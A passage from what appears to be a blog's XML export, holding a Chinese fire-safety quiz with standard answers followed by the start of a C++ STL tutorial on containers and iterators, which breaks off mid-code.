<ul>
<li>A、油类起火<br> B、酒精起火<br> C、电器起火<br> D、棉被起火</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     210、[单选题]<strong>在火灾逃生方法中，以下不正确的是：</strong> （分值1.0）</p>
<ul>
<li>A、用湿毛巾捂着嘴巴和鼻子<br> B、弯着身子快速跑到安全地点<br> C、躲在床底下，等待消防人员救援<br> D、马上从最近的消防通道跑到安全地点</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     211、[单选题]<strong>灭火的四种方法是：</strong> （分值1.0）</p>
<ul>
<li>A、捂盖法、扑打法、浇水法、隔开法<br> B、扑灭法、救火法、化学法、泡沫法<br> C、隔离法、窒息法、冷却法、化学抑制法</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     212、[单选题]<strong>在火灾初发阶段，应采取哪种方法撤离？</strong> （分值1.0）</p>
<ul>
<li>A、乘坐电梯<br> B、用湿毛巾捂住口鼻低姿从安全通道撤离<br> C、跳楼逃生<br> D、跑到楼顶呼救</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     213、[单选题]<strong>我国消防工作的方针是：</strong> （分值1.0）</p>
<ul>
<li>A、群防群治<br> B、遏制种特大火灾<br> C、预防为主，防消结合</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     214、[单选题]<strong>窒息灭火法是将氧气浓度降低至最低限度，以防止火势继续扩大。其主要工具是：</strong> （分值1.0）</p>
<ul>
<li>A、砂子<br> B、水<br> C、二氧化碳灭火器<br> D、干粉灭火器</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     215、[单选题]<strong>我国消防宣传活动日是每年的</strong> （分值1.0）</p>
<ul>
<li>A、11月9日<br> B、1月19日<br> C、9月11日<br> D、9月10日</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     216、[单选题]<strong>被火困在室内,如何逃生？</strong> （分值1.0）</p>
<ul>
<li>A、跳楼<br> B、到窗口或阳台挥动物品求救、用床单或绳子拴在室内牢固处下到 下一层逃生<br> C、躲到床下,等待救援<br> D、打开门,冲出去</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     217、[单选题]<strong>实验大楼因出现火情发生浓烟已穿入实验室内时，以下哪种行为是正确的？</strong> （分值1.0）</p>
<ul>
<li>A、沿地面匍匐前进，当逃到门口时，不要站立开门<br> B、打开实验室门后不用随手关门<br> C、从楼上向楼下外逃时可以乘电梯</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     218、[单选题]<strong>楼内失火应( )</strong> （分值1.0）</p>
<ul>
<li>A、从疏散通道逃离<br> B、乘坐电梯逃离<br> C、在现场等待救援<br> D、见到门口就跑</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     219、[单选题]<strong>任何单位（ ）都有参加组织的灭火工作的义务。</strong> （分值1.0）</p>
<ul>
<li>A、男性公民<br> B、成年公民<br> C、包括少年儿童在内的所有人员</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     220、[单选题]<strong>在室外灭火时，应站在什么位置 ？</strong> （分值1.0）</p>
<ul>
<li>A、上风<br> B、下风<br> C、随便哪里</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     221、[单选题]<strong>火灾蔓延的途径是:</strong> （分值1.0）</p>
<ul>
<li>A、热传导<br> B、热对流<br> C、热辐射<br> D、以上都是</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     222、[单选题]<strong>火灾初起阶段是扑救火灾( )的阶段。</strong> （分值1.0）</p>
<ul>
<li>A、最不利<br> B、最有利<br> C、较不利</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     223、[单选题]<strong>扑救电气设备火灾时，不能用什么灭火器?</strong> （分值1.0）</p>
<ul>
<li>A、四氯化碳灭火器<br> B、二氧化碳灭火器<br> C、泡沫灭火器</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     224、[单选题]<strong>发生火灾时，正确的安全疏散主要有三个方向，向下可以跑到地面，向上可以爬到屋顶，还可以（）</strong> （分值1.0）</p>
<ul>
<li>A、躲到角落里<br> B、向外逃到阳台<br> C、钻到阁楼、大橱等处避难</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     225、[单选题]<strong>干粉灭火器适用于：</strong> （分值1.0）</p>
<ul>
<li>A、电器起火<br> B、可燃气体起火<br> C、有机溶剂起火<br> D、以上都是</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     226、[单选题]<strong>引起电器线路火灾的原因是：</strong> （分值1.0）</p>
<ul>
<li>A. 短路<br> B. 电火花<br> C. 负荷过载<br> D．以上都是</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     227、[单选题]<strong>使用灭火器扑救火灾时要对准火焰的什么部位喷射。</strong> （分值1.0）</p>
<ul>
<li>A. 上部<br> B. 中部<br> C. 根部<br> D. 中上部</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     228、[单选题]<strong>下列哪项不是影响混合物爆炸极限的因素?</strong> （分值1.0）</p>
<ul>
<li>A. 混合物的温度、压力<br> B. 混合物的多少<br> C. 混合物的含氧量<br> D. 容器的大小</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     229、[单选题]<strong>下列选项中属于防爆的措施有：</strong> （分值1.0）</p>
<ul>
<li>A. 防止形成爆炸性混合物的化学品泄漏<br> B. 控制可燃物形成爆炸性混合物<br> C. 消除火源、安装检测和报警装置<br> D. 以上都是</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     230、[单选题]<strong>窒息灭火法是将氧气浓度降低至最低限度，以防止火势继续扩大。其主要工具是：</strong> （分值1.0）</p>
<ul>
<li>A. 砂子<br> B. 水<br> C. 二氧化碳灭火器<br> D. 干粉灭火器</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     231、[单选题]<strong>采取适当的措施，使燃烧因缺乏或隔绝氧气而熄灭，这种方法称作:</strong> （分值1.0）</p>
<ul>
<li>A. 窒息灭火法<br> B. 隔离灭火法<br> C. 冷却灭火法</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     232、[单选题]<strong>身上着火后,下列哪种灭火方法是错误的？</strong> （分值1.0）</p>
<ul>
<li>A. 就地打滚<br> B. 用厚重衣物覆盖压灭火苗<br> C. 迎风快跑<br> D. 大量水冲或跳入水中</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     233、[单选题]<strong>在火灾逃生方法中，以下不正确的是：</strong> （分值1.0）</p>
<ul>
<li>A.用湿毛巾捂着嘴巴和鼻子??????<br> B.弯着身子快速跑到安全地点<br> C.躲在床底下，等待消防人员救援?<br> D.马上从最近的消防通道跑到安全地点。</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     234、[单选题]<strong>实验室仪器设备用电或线路发生故障着火时，应立即     ，并组织人员用灭火器进行灭火。</strong> （分值1.0）</p>
<ul>
<li>A．将贵重仪器设备迅速转移<br> B．切断现场电源<br> C．将人员疏散</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     235、[单选题]<strong>如果实验出现火情，要立即：</strong> （分值1.0）</p>
<ul>
<li>A．停止加热，移开可燃物，切断电源，用灭火器灭火<br> B．打开实验室门，尽快疏散、撤离人员<br> C．用干毛巾覆盖上火源，使火焰熄灭</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     236、[单选题]<strong>实验大楼因出现火情发生浓烟已穿入实验室内时，以下哪种行为是正确的？</strong> （分值1.0）</p>
<ul>
<li> A．沿地面匍匐前进，当逃到门口时，不要站立开门<br> B．打开实验室门后不用随手关门<br> C．从楼上向楼下外逃时可以乘电梯</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     237、[单选题]<strong>实验大楼安全出口的疏散门应：</strong> （分值1.0）</p>
<ul>
<li>A. 自由开启<br> B. 向外开启<br> C. 向内开启<br> D. 关闭，需要时可自行开启</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     238、[单选题]<strong>身上着火，最好的做法是：</strong> （分值1.0）</p>
<ul>
<li>A. 就地打滚或用水冲<br> B. 奔跑<br> C. 大声呼救<br> D. 边跑边脱衣服</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     239、[单选题]<strong>在遇到高压电线断落地面时，导线断落点多少米内，禁止人员进入。</strong> （分值1.0）</p>
<ul>
<li>A．10<br> B．20<br> C．30<br> D. 50</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     240、[单选题]<strong>进行照明设施的接电操作，应采取的防触电措施为：</strong> （分值1.0）</p>
<ul>
<li>A. 湿手操作<br> B. 切断电源<br> C. 站在金属登子或梯子上<br> D. 戴上手套</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     241、[单选题]<strong>一般居民住宅、办公场所，若以防止触电为主要目的时，应选用漏电动作电流为多少的漏电保护开关？</strong> （分值1.0）</p>
<ul>
<li>A. 6 mA<br> B. 15mA<br> C. 30mA<br> D. 50mA</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     242、[单选题]<strong>发生触电事故的危险电压一般是?多少伏以上？</strong> （分值1.0）</p>
<ul>
<li>A．24<br> B．26<br> C．65<br> D. 110</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     243、[单选题]<strong>万一发生电气火灾，首先应该采取的第一条措施是：</strong> （分值1.0）</p>
<ul>
<li>A. 打电话报警<br> B. 切断电源<br> C. 扑灭明火<br> D. 求援</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     244、[单选题]<strong>在火灾初发阶段，应采取哪种方法撤离？</strong> （分值1.0）</p>
<ul>
<li>A. 乘坐电梯<br> B. 用湿毛巾捂住口鼻低姿从安全通道撤离<br> C. 跳楼逃生<br> D. 跑到楼顶呼救</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     245、[单选题]<strong>火灾发生时，湿毛巾折叠8层为宜，其烟雾浓度消除率可达：</strong> （分值1.0）</p>
<ul>
<li>A. 40%<br> B. 60%<br> C. 80%<br> D. 95%</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     246、[单选题]<strong>火灾蔓延的途径是:</strong> （分值1.0）</p>
<ul>
<li>A. 热传导<br> B. 热对流<br> C. 热辐射<br> D. 以上都是</li>
</ul>
<p>​              你未作答            标准答案：                  D                            </p>
<p>​     247、[单选题]<strong>扑救易燃液体火灾时，应用那种方法？</strong> （分值1.0）</p>
<ul>
<li>A. 用灭火器<br> B. 用水泼<br> C. 扑打<br> D. 以上都可以 </li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     248、[单选题]<strong>扑灭电器火灾不宜使用下列何种灭火器材？</strong> （分值1.0）</p>
<ul>
<li>A. 二氧化碳灭火器<br> B. 干粉灭火器<br> C. 泡沫灭火器<br> D. 灭火砂</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     249、[单选题]<strong>实验室电器设备所引起的火灾，应：</strong> （分值1.0）</p>
<ul>
<li>A．用水灭火<br> B．用二氧化碳或干粉灭火器灭火<br> C．用泡沫灭火器灭火</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     250、[单选题]<strong>火灾发生时，湿毛巾折叠8层为宜，其烟雾浓度消除率可达：</strong> （分值1.0）</p>
<ul>
<li>A、40%<br> B、60%<br> C、80%<br> D、95</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     251、[单选题]<strong>当打开房门闻到燃气气味时，要迅速( )，以防止引起火灾。</strong> （分值1.0）</p>
<ul>
<li>A、打开燃气灶具查找漏气部位<br> B、打开门窗通风<br> C、立刻打电话给燃气公司</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     252、[单选题]<strong>下列不具备消防监督检查资格的是（ ）。</strong> （分值1.0）</p>
<ul>
<li>A、公安消防机构<br> B、治安联防队<br> C、公安派出所</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     253、[单选题]<strong>当遇到火灾时，要迅速向（ ）逃生。</strong> （分值1.0）</p>
<ul>
<li>A、着火相反的方向<br> B、人员多的方向<br> C、安全出口的方向</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     254、[单选题]<strong>灭火器上的压力表用红、黄、绿三色表示灭火器的压力情况，当指针指在绿色区域表示：</strong> （分值1.0）</p>
<ul>
<li>A、正常<br> B、偏高<br> C、偏低</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     255、[单选题]<strong>由于行为人的过失引起火灾，造成严重后果的行为，构成（ ）</strong> （分值1.0）</p>
<ul>
<li>A、纵火罪<br> B、失火罪<br> C、重大责任事故罪</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     256、[单选题]<strong>实验室电器发生火灾，在没有灭火器的情况下应先：</strong> （分值1.0）</p>
<ul>
<li>A、用水扑救<br> B、用毛毯包裹<br> C、切断电源<br> D、用沙盘灭火</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     257、[单选题]<strong>我国大陆通用的火警电话号码是：</strong> （分值1.0）</p>
<ul>
<li>A、991<br> B、119<br> C、911</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     258、[单选题]<strong>从下列选项中选择万一发生电气火灾后首先应该采取的第一条措施</strong> （分值1.0）</p>
<ul>
<li>A、打电话报警<br> B、切断电源<br> C、扑灭明火<br> D、保护现场，分析火因，以便采取措施，杜绝隐患</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     259、[单选题]<strong>有机物或能与水发生剧烈化学反应的药品着火，应用 （ ），以免扑救不当造成更大损害。</strong> （分值1.0）</p>
<ul>
<li>A、其他有机物灭火<br> B、自来水灭火<br> C、灭火器或沙子扑灭</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     260、[单选题]<strong>阻拦报火警或者谎报火警的给予（ ）处罚。</strong> （分值1.0）</p>
<ul>
<li>A、劳动教养<br> B、撤掉其电话<br> C、警告、罚款或者十日以下拘留</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     261、[单选题]<strong>违反《中华人民共和国消防法》行为，构成犯罪的，应：</strong> （分值1.0）</p>
<ul>
<li>A、依法给予行政处罚<br> B、依法追究刑事责任<br> C、给予罚款或拘留</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     262、[单选题]<strong>学校教学楼应配备的灭火器型号是（ ）</strong> （分值1.0）</p>
<ul>
<li>A、ABC干粉灭火器<br> B、BC干粉灭火器<br> C、泡沫灭火器</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     263、[单选题]<strong>泡沫灭火器不能用于扑救 （ ）火灾。</strong> （分值1.0）</p>
<ul>
<li>A、塑料<br> B、汽油<br> C、金属钠</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     264、[单选题]<strong>《中华人民共和国消防法》自（ ）起施行。</strong> （分值1.0）</p>
<ul>
<li>A、1997年<br> B、1998年<br> C、2000年</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     265、[单选题]<strong>火场逃生的原则是 ( ) 。</strong> （分值1.0）</p>
<ul>
<li>A、抢救国家财产为上<br> B、先带上日后生活必需钱财要紧<br> C、安全撤离、救助结合<br> D、逃命要紧</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     266、[单选题]<strong>身上着火后,下列哪种灭火方法是错误的？</strong> （分值1.0）</p>
<ul>
<li>A、就地打滚<br> B、用厚重衣物覆盖压灭火苗<br> C、迎风快跑<br> D、大量水冲或跳入水中</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     267、[单选题]<strong>火灾中对人员威胁最大的是（ ）。</strong> （分值1.0）</p>
<ul>
<li>A、火<br> B、烟气<br> C、可燃物</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     268、[单选题]<strong>按照国家工程建筑消防技术标准施工的项目竣工时，（ ）经公安消防机构进行消防验收。</strong> （分值1.0）</p>
<ul>
<li>A、必须<br> B、可以<br> C、应当</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     269、[单选题]<strong>公安消防人员在灭火过程中，应当（ ）。</strong> （分值1.0）</p>
<ul>
<li>A、优先救人<br> B、优先抢救财物<br> C、优先灭火 </li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     270、[单选题]<strong>如果睡觉时被烟火呛醒，正确的做法是（）。</strong> （分值1.0）</p>
<ul>
<li>A、寻找逃生通道<br> B、往床底下钻<br> C、找衣服穿或抢救心爱的东西</li>
</ul>
<p>​              你未作答            标准答案：                  A                            </p>
<p>​     271、[单选题]<strong>实验室仪器设备用电或线路发生故障着火时，应立即（ ），并组织人员用灭火器进行灭火。</strong> （分值1.0）</p>
<ul>
<li>A、将贵重仪器设备迅速转移<br> B、切断现场电源<br> C、将人员疏散</li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     272、[单选题]<strong>使用灭火器扑救火灾时要对准火焰的什么部位喷射。</strong> （分值1.0）</p>
<ul>
<li>A、上部<br> B、中部<br> C、根部<br> D、中上部</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
<p>​     273、[单选题]<strong>公共场所安全出口的疏散门应（ ）。</strong> （分值1.0）</p>
<ul>
<li>A、双向开启<br> B、向外开启<br> C、向内开启 </li>
</ul>
<p>​              你未作答            标准答案：                  B                            </p>
<p>​     274、[单选题]<strong>公安消防队救火（）</strong> （分值1.0）</p>
<ul>
<li>A、只收救火成本费<br> B、收取所有费用<br> C、不收任何费用</li>
</ul>
<p>​              你未作答            标准答案：                  C                            </p>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
  </entry>
  <entry>
    <title>C++ STL（标准模板库）</title>
    <url>/2020/10/30/STL/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><p>本文仅为个人学习使用，非原创来源如下：<a href="http://c.biancheng.net/cplus/80/">C语言中文网</a></p>
<p>C++ 语言的核心优势之一就是便于软件的重用。C++ 中有两个方面体现重用：</p>
<ul>
<li>一是面向对象的继承和多态机制；</li>
<li>二是通过模板的概念实现了对泛型程序设计的支持。</li>
</ul>
<p>C++ 的标准模板库（Standard Template Library，STL）是泛型程序设计最成功应用的实例。STL 是一些常用数据结构（如链表、可变长数组、排序二叉树）和算法（如排序、查找）的模板的集合，主要由 Alex Stepanov 主持开发，于 1998 年被加入 C++ 标准。</p>
<p>有了 STL，程序员就不必编写大多数常用的数据结构和算法。而且 STL 是经过精心设计的，运行效率很高，比水平一般的程序员编写的同类代码速度更快。</p>
<p>有一种说法，C++ 是用来编写大程序的，如果只是编写几十上百行的小程序，用C语言就可以，没有必要用 C++。</p>
<p>这个说法是不准确的。可以说，写小程序没必要用面向对象的方法，但是用 C++ 还是能够带来很大方便的，因为 C++ 中有 STL。哪怕编写只有十几行的程序，也可能会用到 STL 中提供的数据结构和算法。例如对数组排序，用 STL 中的 sort 算法往往只需要一条语句就能解决，而不用像调用C语言库函数 qsort 那样还要编写比较函数。</p>
<a id="more"></a>
<h4 id="C-容器（STL容器）"><a href="#C-容器（STL容器）" class="headerlink" title="C++容器（STL容器）"></a>C++容器（STL容器）</h4><p>容器（container）用于存放数据的类模板。可变长数组、链表、平衡二叉树等<a href="http://c.biancheng.net/data_structure/">数据结构</a>在 <a href="http://c.biancheng.net/stl/">STL</a> 中都被实现为容器。</p>
<p>程序员使用容器时，即将容器类模板实例化为容器类时，会指明容器中存放的元素是什么类型的。</p>
<p>容器中可以存放基本类型的变量，也可以存放对象。对象或基本类型的变量被插入容器中时，实际插入的是对象或变量的一个复制品。</p>
<p>STL 中的许多算法（即函数模板），如排序、查找等算法，在执行过程中会对容器中的元素进行比较。这些算法在比较元素是否相等时通常用运算符进行，比较大小通常用<code>&lt;</code>运算符进行，因此，被放入容器的对象所属的类最好重载<code>==</code>和<code>&lt;</code>运算符，以使得两个对象用<code>==</code>和<code>&lt;</code>进行比较是有定义的。</p>
<p>容器分为两大类。</p>
<p><strong>顺序容器</strong></p>
<p>顺序容器有以下三种：可变长动态数组 vector、双端队列 deque、双向链表 list。</p>
<p>它们之所以被称为顺序容器，是因为元素在容器中的位置同元素的值无关，即容器不是排序的。将元素插入容器时，指定在什么位置（尾部、头部或中间某处）插入，元素就会位于什么位置。</p>
<p><strong>关联容器</strong></p>
<p>关联容器有以下四种：set、multiset、map、multimap。关联容器内的元素是排序的。插入元素时，容器会按一定的排序规则将元素放到适当的位置上，因此插入元素时不能指定位置。</p>
<p>默认情况下，关联容器中的元素是从小到大排序（或按关键字从小到大排序）的，而且用<code>&lt;</code>运算符比较元素或关键字大小。因为是排好序的，所以关联容器在查找时具有非常好的性能。</p>
<p>除了以上两类容器外，STL 还在两类容器的基础上屏蔽一部分功能，突出或增加另一部分功能，实现了三种容器适配器：栈 stack、队列 queue、优先级队列 priority_queue。</p>
<p>为称呼方便起见，本教程后面将容器和容器适配器统称为容器。</p>
<p>容器都是类模板。它们实例化后就成为容器类。用容器类定义的对象称为容器对象。</p>
<p>例如，<code>vector&lt;int&gt;</code>是一个容器类的名字，<code>vector&lt;int&gt; a;</code>就定义了一个容器对象 a，a 代表一个长度可变的数组，数组中的每个元素都是 int 类型的变量；<code>vector&lt;double&gt; b;</code>定义了另一个容器对象 b，a 和 b 的类型是不同的。本教程后文所说的“容器”，有时也指“容器对象”，读者需要根据上下文自行判别。</p>
<p>任何两个容器对象，只要它们的类型相同，就可以用 &lt;、&lt;=、&gt;、&gt;=、==、!= 进行词典式的比较运算。假设 a、b 是两个类型相同的容器对象，这些运算符的运算规则如下。</p>
<ul>
<li>a == b：若 a 和 b 中的元素个数相同，且对应元素均相等，则<code>a == b</code>的值为 true，否则值为 false。元素是否相等是用<code>==</code>运算符进行判断的。</li>
<li>a&lt;b：规则类似于词典中两个单词比较大小，从头到尾依次比较每个元素，如果发生 a 中的元素小于 b 中的元素的情况，则<code>a&lt;b</code>的值为 true；如果没有发生 b 中的元素小于 a 中的元素的情况，且 a 中的元素个数比 b 少，<code>a&lt;b</code>的值也为 true；其他情况下值为 false。元素比较大小是通过<code>&lt;</code>运算符进行的。</li>
<li>a != b：等价于 !(a == b)。</li>
<li>a &gt; b：等价于 b &lt; a。</li>
<li>a &lt;= b：等价于 !(b &lt; a)。</li>
<li>a &gt;= b：等价于 !(a &lt; b)。</li>
</ul>
<p>所有容器都有以下两个成员函数：</p>
<ul>
<li>int size()：返回容器对象中元素的个数。</li>
<li>bool empty()：判断容器对象是否为空。</li>
</ul>
<p>顺序容器和关联容器还有以下成员函数：</p>
<ul>
<li>begin()：返回指向容器中第一个元素的迭代器。</li>
<li>end()：返回指向容器中最后一个元素后面的位置的迭代器。</li>
<li>rbegin()：返回指向容器中最后一个元素的反向迭代器。</li>
<li>rend()：返回指向容器中第一个元素前面的位置的反向迭代器。</li>
<li>erase(…)：从容器中删除一个或几个元素。该函数参数较复杂，此处省略。</li>
<li>clear()：从容器中删除所有元素。</li>
</ul>
<p>如果一个容器是空的，则 begin() 和 end() 的返回值相等，rbegin() 和 rend() 的返回值也相等。</p>
<p>顺序容器还有以下常用成员函数：</p>
<ul>
<li>front()：返回容器中第一个元素的引用。</li>
<li>back()：返回容器中最后一个元素的引用。</li>
<li>push_back()：在容器末尾增加新元素。</li>
<li>pop_back()：删除容器末尾的元素。</li>
<li>insert(…)：插入一个或多个元素。该函数参数较复杂，此处省略。</li>
</ul>
<h4 id="C-迭代器（STL迭代器）iterator详解"><a href="#C-迭代器（STL迭代器）iterator详解" class="headerlink" title="C++迭代器（STL迭代器）iterator详解"></a>C++迭代器（STL迭代器）iterator详解</h4><p>要访问顺序容器和关联容器中的元素，需要通过“迭代器（iterator）”进行。迭代器是一个变量，相当于容器和操纵容器的算法之间的中介。迭代器可以指向容器中的某个元素，通过迭代器就可以读写它指向的元素。从这一点上看，迭代器和<a href="http://c.biancheng.net/c/80/">指针</a>类似。</p>
<p>迭代器按照定义方式分成以下四种。</p>
<p>1) 正向迭代器，定义方法如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">容器类名::iterator 迭代器名;</span><br></pre></td></tr></table></figure>
<p>2) 常量正向迭代器，定义方法如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">容器类名::const_iterator 迭代器名;</span><br></pre></td></tr></table></figure>
<p>3) 反向迭代器，定义方法如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">容器类名::reverse_iterator 迭代器名;</span><br></pre></td></tr></table></figure>
<p>4) 常量反向迭代器，定义方法如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">容器类名::const_reverse_iterator 迭代器名;</span><br></pre></td></tr></table></figure>
<p><strong>迭代器用法示例</strong></p>
<p>通过迭代器可以读取它指向的元素，<code>*迭代器名</code>就表示迭代器指向的元素。通过非常量迭代器还能修改其指向的元素。</p>
<p>迭代器都可以进行<code>++</code>操作。反向迭代器和正向迭代器的区别在于：</p>
<ul>
<li>对正向迭代器进行<code>++</code>操作时，迭代器会指向容器中的后一个元素；</li>
<li>而对反向迭代器进行<code>++</code>操作时，迭代器会指向容器中的前一个元素。</li>
</ul>
<p>下面的程序演示了如何通过迭代器遍历一个 vector 容器中的所有元素。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v;  <span class="comment">//v是存放int类型变量的可变长数组，开始时没有元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">0</span>; n&lt;<span class="number">5</span>; ++n)</span><br><span class="line">        v.push_back(n);  <span class="comment">//push_back成员函数在vector容器尾部添加一个元素</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator i;  <span class="comment">//定义正向迭代器</span></span><br><span class="line">    <span class="keyword">for</span> (i = v.begin(); i != v.end(); ++i) &#123;  <span class="comment">//用迭代器遍历容器</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *i &lt;&lt; <span class="string">&quot; &quot;</span>;  <span class="comment">//*i 就是迭代器i指向的元素</span></span><br><span class="line">        *i *= <span class="number">2</span>;  <span class="comment">//每个元素变为原来的2倍</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//用反向迭代器遍历容器</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::reverse_iterator j = v.rbegin(); j != v.rend(); ++j)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *j &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序的输出结果是：<br>0 1 2 3 4<br>8 6 4 2 0</p>
<p>第 6 行，vector 容器有多个构造函数，如果用无参构造函数初始化，则容器一开始是空的。</p>
<p>第 10 行，begin 成员函数返回指向容器中第一个元素的迭代器。++i 使得 i 指向容器中的下一个元素。end 成员函数返回的不是指向最后一个元素的迭代器，而是指向最后一个元素后面的位置的迭代器，因此循环的终止条件是<code>i != v.end()</code>。</p>
<p>第 16 行定义了反向迭代器用以遍历容器。反向迭代器进行<code>++</code>操作后，会指向容器中的上一个元素。rbegin 成员函数返回指向容器中最后一个元素的迭代器，rend 成员函数返回指向容器中第一个元素前面的位置的迭代器，因此本循环实际上是从后往前遍历整个数组。</p>
<p>如果迭代器指向了容器中最后一个元素的后面或第一个元素的前面，再通过该迭代器访问元素，就有可能导致程序崩溃，这和访问 NULL 或未初始化的指针指向的地方类似。</p>
<p>第 10 行和第 16 行，写<code>++i</code>、<code>++j</code>相比于写<code>i++</code>、<code>j++</code>，程序的执行速度更快。回顾<code>++</code>被重载成前置和后置运算符的例子如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">CDemo CDemo::<span class="keyword">operator</span>++ ()</span><br><span class="line">&#123;  <span class="comment">//前置++</span></span><br><span class="line">    ++n;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">CDemo CDemo::<span class="keyword">operator</span> ++(<span class="keyword">int</span> k)</span><br><span class="line">&#123;  <span class="comment">//后置++</span></span><br><span class="line">    <span class="function">CDemo <span class="title">tmp</span><span class="params">(*<span class="keyword">this</span>)</span></span>;  <span class="comment">//记录修改前的对象</span></span><br><span class="line">    n++;</span><br><span class="line">    <span class="keyword">return</span> tmp;  <span class="comment">//返回修改前的对象</span></span><br><span 